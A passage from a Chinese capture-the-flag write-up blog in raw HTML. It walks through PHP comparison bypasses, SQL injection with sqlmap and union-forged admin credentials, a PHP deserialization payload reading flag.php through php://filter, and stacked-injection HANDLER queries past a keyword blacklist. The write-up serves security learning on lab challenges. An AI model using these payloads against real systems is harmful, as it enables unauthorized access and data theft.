class="hljs-comment">//❗强等于，数组绕过即可</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;            $passwd=$_POST[<span class="hljs-string">&#x27;passwd&#x27;</span>];            <span class="hljs-keyword">if</span> (!is_numeric($passwd))            &#123;                 <span class="hljs-keyword">if</span>($passwd==<span class="hljs-number">1234567</span>)   <span class="hljs-comment">//passwd=1234567a即可绕过</span>                 &#123;                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;                     highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);   <span class="hljs-comment">//❗</span>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);                 &#125;                 <span class="hljs-keyword">else</span>                 &#123;                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;                 &#125;            &#125;            <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;            &#125;        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);  <span class="hljs-comment">//passwd没赋值的情况</span>        &#125;&#125;    <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);&#125;&#125;Please input first</code></pre><p>md5比较：</p><p>但是，强比较（===）不仅比较值，还比较类型，0e此时被当作字符串，所以不能用0e来进行绕过碰撞，只能用数组绕过，or ，找两个值不同但MD5相同的</p><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-title">array</span>()) = <span class="hljs-variable"><span class="hljs-literal">null</span></span></span></code></pre><p>payload：</p><pre><code class="hljs angelscript">?gg[]=<span class="hljs-number">1</span>&amp;id[]=<span class="hljs-number">2</span>passwd=<span class="hljs-number">1234567</span>a</code></pre><h2 id="GXYCTF2019-BabySQli（-）"><a href="#GXYCTF2019-BabySQli（-）" class="headerlink" title="[GXYCTF2019]BabySQli（*）"></a>[GXYCTF2019]BabySQli（*）</h2><h4 id="考点：手工-联合查询不存在数据构造虚拟数据绕过md5密码验证"><a href="#考点：手工-联合查询不存在数据构造虚拟数据绕过md5密码验证" class="headerlink" title="考点：手工+联合查询不存在数据构造虚拟数据绕过md5密码验证"></a>考点：手工+联合查询不存在数据构造虚拟数据绕过md5密码验证</h4><p>关键点：对orderby后并不回显123而是验证用户名/密码正确与否，——绕过密码的md5验证：需要把我们输入的值和数据库里面存放的用户密码的md5值进行比较，<strong>可以用联合查询语句用来生成虚拟的表数据覆盖原用户admin绕过</strong></p><p>点进去是登录框，然后name有注入点而pw没有！</p><p>sqlmap跑：发现是延时注入</p><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php --forms</code></pre><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309120711794.png" alt="image-20220309120711794" style="zoom:67%;"><p>跑库名 ：</p><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php --current-db --forms<span class="hljs-attribute">web_sqli</span></code></pre><p>跑表名：</p><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php -D web_sqli --tables --forms<span class="hljs-attribute">user</span></code></pre><p>爆数据</p><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php -D web_sqli -T user --dump --forms -C id<span class="hljs-attribute">1</span><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php -D web_sqli -T user --dump --forms -C username<span class="hljs-attribute">admin</span><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php -D web_sqli -T user --dump --forms -C passwd<span class="hljs-attribute">cdc9c819c7f8be2628d4180669009d28</span></code></pre><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309121646850.png" alt="image-20220309121646850" style="zoom:67%;"><p>但是登录不上去，密码尝试md5破解也不行，base32加密再base64加密也不行【后续手工发现是hash了，但是没有告知盐，所以这里密码不能破解】</p><p>手工：</p><p>提交数据后跳转到search.php，源码看到注释提示，base64/md5都解不出来，一键解码工具</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309122020599.png" alt="image-20220309122020599" style="zoom:80%;"><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309122033327.png" alt="image-20220309122033327" style="zoom: 67%;"><p>解出SQL语句</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309122102792.png" alt="image-20220309122102792" style="zoom:67%;"><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> user </span>where username = <span class="hljs-string">&#x27;$name&#x27;</span></code></pre><p>看来真是name存在注入</p><p>order被过滤：大小写字母就能绕过</p><pre><code class="hljs routeros"><span class="hljs-attribute">name</span>=1&#x27;Order by 3#&amp;<span class="hljs-attribute">pw</span>=2  ——wrong user!<span class="hljs-attribute">name</span>=1&#x27;Order by 4#&amp;<span class="hljs-attribute">pw</span>=2  ——Error: Unknown column <span class="hljs-string">&#x27;4&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;order clause&#x27;</span>——3列数据</code></pre><p>然后<code>name=-&#39;union select 1,2,3#&amp;pw=2</code>发现回显<strong>wrong user!</strong></p><p>而<code>name=-&#39;union select 1,&#39;admin&#39;,3#&amp;pw=2</code>回显wrong pass</p><p><strong>那么就是先查询，查询不到数据则 ’ worry user’,再用查询出来的数据对比password，对比不符合则 ’ worry pass ’</strong></p><p>但当我们是测试admin用户时却回显wrong pass!(密码错误)，很明显这里绝对存在admin这个账号。此时，我们的思路就是登上admin用户或者得到admin的密码，但是密码是经过hash运算的，怎么得知/解密呢？</p><h4 id="新知识点：虚拟数据"><a href="#新知识点：虚拟数据" class="headerlink" title="新知识点：虚拟数据"></a>新知识点：虚拟数据</h4><blockquote><p><a href="https://blog.csdn.net/qq_45521281/article/details/107167452">参考WP</a></p></blockquote><p> <strong>当查询的数据不存在的时候，联合查询就会构造一个虚拟的数据</strong></p><p>举个例子：如果users表中只有一行数据，我们通过union select查询就可以构造一行虚拟的数据，</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/20200706211115507.png" style="zoom:80%;"><p><strong>那么我们的思路就来了，我们可以利用联合查询来创建一行admin账户的续集数据，混淆admin用户的密码，将我们自定义的admin用户的密码（123）加进去，这样我们不就可以登录admin用户了吗。</strong></p><p>看到源码</p><pre><code class="hljs php">mysqli_query($con,<span class="hljs-string">&#x27;SET NAMES UTF8&#x27;</span>);$name = $_POST[<span class="hljs-string">&#x27;name&#x27;</span>];$password = $_POST[<span class="hljs-string">&#x27;pw&#x27;</span>];$t_pw = md5($password);$sql = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.$name.<span class="hljs-string">&quot;&#x27;&quot;</span>;<span class="hljs-comment">// echo $sql;</span>$result = mysqli_query($con, $sql);<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, $name))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;do not hack me!&quot;</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">if</span> (!$result) &#123;printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error($con));<span class="hljs-keyword">exit</span>();&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">// echo &#x27;&lt;pre&gt;&#x27;;</span>$arr = mysqli_fetch_row($result);<span class="hljs-comment">// print_r($arr);</span><span class="hljs-keyword">if</span>($arr[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;    <span class="hljs-comment">//第二列数据要等于admin</span><span class="hljs-keyword">if</span>(md5($password) == $arr[<span class="hljs-number">2</span>])&#123;   <span class="hljs-comment">//第三列数据要等与密码的MD5</span><span class="hljs-keyword">echo</span> $flag;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong pass!&quot;</span>);&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong user!&quot;</span>);&#125;&#125;&#125;</code></pre><p>payload:</p><pre><code class="hljs apache"><span class="hljs-attribute">123456</span>  md<span class="hljs-number">5</span>:e<span class="hljs-number">10</span>adc<span class="hljs-number">3949</span>ba<span class="hljs-number">59</span>abbe<span class="hljs-number">56</span>e<span class="hljs-number">057</span>f<span class="hljs-number">20</span>f<span class="hljs-number">883</span>e<span class="hljs-attribute">name</span>=&#x27;union select <span class="hljs-number">1</span>,&#x27;admin&#x27;,&#x27;e<span class="hljs-number">10</span>adc<span class="hljs-number">3949</span>ba<span class="hljs-number">59</span>abbe<span class="hljs-number">56</span>e<span class="hljs-number">057</span>f<span class="hljs-number">20</span>f<span class="hljs-number">883</span>e&#x27;#&amp;pw=<span class="hljs-number">123456</span></code></pre><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309131226258.png" alt="image-20220309131226258" style="zoom:67%;"><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><h4 id="考点：反序列化构造、伪协议绕过file-get-contents、私有属性序列化后-00被拦截"><a href="#考点：反序列化构造、伪协议绕过file-get-contents、私有属性序列化后-00被拦截" class="headerlink" title="考点：反序列化构造、伪协议绕过file_get_contents、私有属性序列化后%00被拦截"></a>考点：反序列化构造、伪协议绕过file_get_contents、私有属性序列化后%00被拦截</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;    <span class="hljs-keyword">protected</span> $op;    <span class="hljs-keyword">protected</span> $filename;    <span class="hljs-keyword">protected</span> $content;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        $op = <span class="hljs-string">&quot;1&quot;</span>;        $filename = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;        $content = <span class="hljs-string">&quot;Hello World!&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;process();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;            <span class="hljs-keyword">$this</span>-&gt;write();        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;            $res = <span class="hljs-keyword">$this</span>-&gt;read();            <span class="hljs-keyword">$this</span>-&gt;output($res);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;content)) &#123;            <span class="hljs-keyword">if</span>(strlen((<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;                <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Too long!&quot;</span>);                <span class="hljs-keyword">die</span>();            &#125;            $res = file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;content);            <span class="hljs-keyword">if</span>($res) <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Successful!&quot;</span>);            <span class="hljs-keyword">else</span> <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;        $res = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename)) &#123;            $res = file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);        &#125;        <span class="hljs-keyword">return</span> $res;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params">$s</span>) </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;        <span class="hljs-keyword">echo</span> $s;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-comment">//4，要跳过写，直接读：op必须不满足===2，且满足==2</span>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)             <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;          <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;process();    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params">$s</span>) </span>&#123;    <span class="hljs-comment">//  2</span>    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; strlen($s); $i++)        <span class="hljs-keyword">if</span>(!(ord($s[$i]) &gt;= <span class="hljs-number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="hljs-number">125</span>))   <span class="hljs-comment">//ord返回ASCII，21-125：可见字符</span>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;    $str = (<span class="hljs-keyword">string</span>)$_GET[<span class="hljs-string">&#x27;str&#x27;</span>];  <span class="hljs-comment">//1</span>    <span class="hljs-keyword">if</span>(is_valid($str)) &#123;         $obj = unserialize($str);  <span class="hljs-comment">//3</span>    &#125;&#125;</code></pre><p>整个流程：GET传参序列化字符串，满足ASCII有效后执行destruct函数，属性op不满足<code>===2</code>，满足<code>==2</code>，就会执行read函数，file_get_contents读取文件并返回结果</p><ol><li>一开始没想到file_get_contents，直接读了flag.php，发现不对，才反应过来<strong>有file_get_contents</strong>==》利用伪协议php://filter，读源码</li><li>同时还要注意：==private属性序列化的时候格式是 %00类名%00成员名，自写脚本直接生成序列化字符串后还要手动加上%00==</li></ol><p>构造脚本：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;    <span class="hljs-keyword">protected</span> $op=<span class="hljs-number">2</span>;    <span class="hljs-keyword">protected</span> $filename=<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;    <span class="hljs-keyword">protected</span> $content;&#125;$flag = <span class="hljs-keyword">new</span> FileHandler();$flag_1 = serialize($flag);<span class="hljs-keyword">echo</span> $flag_1;</code></pre><pre><code class="hljs less">再手动加上%<span class="hljs-selector-tag">00</span><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:11</span><span class="hljs-selector-pseudo">:&quot;FileHandler&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;%00*%00op&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">2</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;%00*%00filename&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">52</span>:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;%00*%00content&quot;</span>;<span class="hljs-selector-tag">N</span>;&#125;</code></pre><ol start="3"><li><p>然后发现又不对，<strong>因为空字符的ASCII是0，不满足一开始的ASCII有效检验</strong>，就不会往后执行，反序列化</p><pre><code class="hljs aspectj"><span class="hljs-function">echo <span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">&#x27;&#x27;</span>)</span></span>;   <span class="hljs-comment">//0</span></code></pre></li></ol><h4 id="如何绕过呢-00？"><a href="#如何绕过呢-00？" class="headerlink" title="如何绕过呢%00？"></a>如何绕过呢%00？</h4><ul><li><strong>简单的一种是：php7.1+版本对属性类型不敏感，使用 public 修饰成员并序列化，反序列化后还是public——本地序列化的时候将属性改为public进行绕过即可</strong></li></ul><p>构造脚本：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;    <span class="hljs-keyword">public</span> $op=<span class="hljs-number">2</span>;    <span class="hljs-keyword">public</span> $filename=<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;    <span class="hljs-keyword">public</span> $content;&#125;$flag = <span class="hljs-keyword">new</span> FileHandler();$flag_1 = serialize($flag);<span class="hljs-keyword">echo</span> $flag_1;</code></pre><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">52</span>:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;N;&#125;</code></pre><p><span style="background:#FF9999;">注意</span>：一开始我用的op=”2a”，发现不行，因为要<code>不满足===且满足==&quot;2&quot;</code>，这里满足的是<strong>弱等于字符串2，而不是数字2</strong></p><pre><code class="hljs ini"><span class="hljs-attr">&quot;2a&quot;</span>  ==  <span class="hljs-string">&quot;2&quot;</span>  x<span class="hljs-attr">&quot;2a&quot;</span>  ==   <span class="hljs-number">2</span>   √<span class="hljs-attr">&quot;2&quot;</span>   ==   <span class="hljs-number">2</span>   √</code></pre><p>然后成功读到flag.php的base64源码，解码得到flag</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312203106671.png" alt="image-20220312203106671"></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><blockquote><p><a href="https://www.cnblogs.com/zzjdbk/p/13681752.html">参考wp</a></p><p><a href="https://xz.aliyun.com/t/7169#toc-47">一些过滤技巧总结</a></p></blockquote><h4 id="考点：堆叠注入，类似强网杯、handler代替select查询"><a href="#考点：堆叠注入，类似强网杯、handler代替select查询" class="headerlink" title="考点：堆叠注入，类似强网杯、handler代替select查询"></a>考点：堆叠注入，类似强网杯、handler代替select查询</h4><p>万能密码，爆出3个内容</p><pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#</code></pre><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312212345118.png" alt="image-20220312212345118" style="zoom:50%;"><p>查出来两个字段</p><pre><code class="hljs crmsh">?<span class="hljs-attr">inject=</span><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">2</span>--+</code></pre><p>黑名单：</p><pre><code class="hljs sql">return preg_match(&quot;/<span class="hljs-keyword">set</span>|<span class="hljs-keyword">prepare</span>|<span class="hljs-keyword">alter</span>|<span class="hljs-keyword">rename</span>|<span class="hljs-keyword">select</span>|<span class="hljs-keyword">update</span>|<span class="hljs-keyword">delete</span>|<span class="hljs-keyword">drop</span>|<span class="hljs-keyword">insert</span>|<span class="hljs-keyword">where</span>|\./i<span class="hljs-string">&quot;,$inject);</span></code></pre><p>只回显一部分数据</p><pre><code class="hljs lsl">?inject=<span class="hljs-number">1</span>&#x27;union selec\at <span class="hljs-number">1</span>,<span class="hljs-number">2</span>%<span class="hljs-number">23</span>er version for the right syntax to use near &#x27;selec\at <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#&#x27;&#x27; at line <span class="hljs-number">1</span></code></pre><p>猜测可能是union被吞了：尝试双写，都不行</p><pre><code class="hljs crystal"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union union s\aelect 1,2%23</span><span class="hljs-string">he right syntax to use near &#x27;</span><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">s</span>\<span class="hljs-title">aelect</span> 1,2<span class="hljs-comment">#&#x27;&#x27; at line 1</span></span></code></pre><p>应该是检测到了union整个单词，然后报错，还是不行</p><pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27;u&lt;&gt;nion sel&lt;&gt;ect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>%<span class="hljs-number">23</span>t syntax to use near &#x27;u&lt;&gt;nion sel&lt;&gt;ect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#&#x27;&#x27; at line <span class="hljs-number">1</span></code></pre><p><strong>试试堆叠注入</strong>：查看所有库名</p><pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">databases</span>;   //这里1后必须要有单引号（字符注入），尾巴<span class="hljs-comment">#可要可不要</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312212801712.png" alt="image-20220312212801712"></p><p>查看当前库下表名：</p><pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<span class="hljs-comment">#</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312213008971.png" alt="image-20220312213008971"></p><h4 id="利用handler直接读表内容"><a href="#利用handler直接读表内容" class="headerlink" title="利用handler直接读表内容"></a>利用handler直接读表内容</h4><blockquote><p><strong>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据</strong></p><p><strong>不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中</strong></p></blockquote><pre><code class="hljs sql">?inject=1&#x27;;<span class="hljs-keyword">handler</span> FlagHere <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> a;<span class="hljs-keyword">handler</span> a <span class="hljs-keyword">read</span> <span class="hljs-keyword">first</span>;<span class="hljs-keyword">handler</span> a <span class="hljs-keyword">close</span>;<span class="hljs-comment">#</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312213440831.png" alt="image-20220312213440831"></p><p>读表列名：flag表有一列</p><pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> <span class="hljs-string">`FlagHere`</span>;</code></pre><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312213600223.png" alt="image-20220312213600223" style="zoom:67%;"><p>而另一张表：有两列</p><pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> <span class="hljs-string">`words`</span>;</code></pre><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313100505291.png" alt="image-20220313100505291" style="zoom:50%;"><h4 id="如果利用强网杯的思路："><a href="#如果利用强网杯的思路：" class="headerlink" title="如果利用强网杯的思路："></a>如果利用强网杯的思路：</h4><blockquote><p>1、将words表名替换成其他的</p><p>2、然后将 <code>FlagHere</code> 这个表名称替换成words</p><p>3、在把flag这个字段替换成data</p><p>4、最后再插入（新增）一个id字段</p><p>最终的查询结果就可以输出我们构造的新的words了</p></blockquote><pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">rename</span> <span class="hljs-keyword">to</span> words1;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-string">`FlagHere`</span> <span class="hljs-keyword">rename</span> <span class="hljs-keyword">to</span> words;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">change</span> flag <span class="hljs-keyword">id</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">50</span>);<span class="hljs-comment">#</span>再利用万能密码爆出表数据</code></pre><p>但是回显，发现过滤了很多：</p><pre><code class="hljs sql">return preg_match(&quot;/<span class="hljs-keyword">set</span>|<span class="hljs-keyword">prepare</span>|<span class="hljs-keyword">alter</span>|<span class="hljs-keyword">rename</span>|<span class="hljs-keyword">select</span>|<span class="hljs-keyword">update</span>|<span class="hljs-keyword">delete</span>|<span class="hljs-keyword">drop</span>|<span class="hljs-keyword">insert</span>|<span class="hljs-keyword">where</span>|\./i<span class="hljs-string">&quot;,$inject);</span></code></pre><p>那就只能用handler</p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>1.prepare的语句</p><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;[my sql sequece]&#x27;</span>;   //预定义SQL语句<span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">name</span>;  //执行预定义SQL语句(<span class="hljs-keyword">DEALLOCATE</span> || <span class="hljs-keyword">DROP</span>) <span class="hljs-keyword">PREPARE</span> <span class="hljs-keyword">name</span>;  //删除预定义SQL语句，可以不用！即：<span class="hljs-keyword">SET</span> @tn = <span class="hljs-string">&#x27;hahaha&#x27;</span>;  //存储表名<span 